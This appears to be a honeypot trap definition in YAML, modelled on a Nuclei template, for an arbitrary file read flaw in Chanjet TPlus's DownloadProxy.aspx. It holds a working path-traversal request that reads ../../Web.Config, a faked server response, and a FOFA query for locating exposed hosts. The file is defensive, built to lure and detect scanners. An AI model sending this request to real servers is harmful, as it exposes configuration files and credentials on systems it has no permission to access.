id: chanjet-tplus-file-read
info:
  name: Chanjet TPlus DownloadProxy.aspx - Arbitrary File Read
  author: SleepingBag945
  description: 'Chanjet TPlus DownloadProxy.aspx file has an arbitrary file reading
    vulnerability. An attacker can obtain sensitive files on the server through the
    vulnerability.

    '
  severity: high
  reference:
  - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/webapp/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20%E7%95%85%E6%8D%B7%E9%80%9AT%2B%20DownloadProxy.aspx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="畅捷通-TPlus"
  tags: yonyou,chanjet,lfi,tplus
traps:
- request:
    method: GET
    path: /tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config
    headers: null
    body: null
  response:
    status_code: 200
    headers:
      VulTrap: application/octet-stream
    body: xml version<configuration>
